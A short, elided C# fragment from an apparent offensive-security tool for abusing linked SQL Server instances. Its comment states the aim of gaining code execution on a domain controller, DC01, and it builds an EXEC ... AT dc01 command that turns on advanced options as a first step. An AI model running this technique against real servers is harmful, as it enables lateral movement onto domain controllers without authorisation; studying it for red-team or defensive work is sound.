...
namespace LinkedSQLServers
{
    class Program
    {
        static void Main(string[] args)
        {
            ...
            // Gain Code Execution on DC01 (DC01 Linked to the Current SQL Server) :
            String Enable_AdvOptions = "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT dc01";
